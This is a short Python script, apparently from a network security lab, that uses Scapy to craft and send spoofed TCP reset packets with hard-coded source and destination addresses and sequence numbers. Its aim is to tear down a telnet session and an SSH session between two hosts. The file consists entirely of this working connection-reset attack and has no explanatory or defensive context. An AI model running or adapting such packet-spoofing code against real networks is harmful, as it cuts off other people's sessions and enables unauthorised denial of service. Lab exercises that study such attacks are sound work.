from scapy.all import *

#telnet
ip= IP(src="10.0.2.4", dst="10.0.2.5")
tcp = TCP(sport=49584, dport=23, flags="R", seq=256971850)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)

#ssh
ip= IP(src="10.0.2.4", dst="10.0.2.5")
tcp = TCP(sport=54680, dport=22, flags="R", seq=2733854051)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
